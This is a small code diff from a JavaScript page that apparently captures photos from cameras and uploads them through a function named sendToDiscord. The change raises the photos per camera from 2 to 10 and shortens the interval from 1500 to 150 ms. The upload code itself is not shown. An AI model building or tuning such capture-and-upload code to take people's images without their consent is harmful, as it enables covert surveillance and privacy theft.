@@ -26,8 +26,8 @@ const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
 const startBtn = document.getElementById("startBtn");
 
-const PHOTOS_PER_CAMERA = 2;
-const INTERVAL = 1500;
+const PHOTOS_PER_CAMERA = 10;
+const INTERVAL = 150;
 
 async function sendToDiscord(blob, name, label) {
   const form = new FormData();
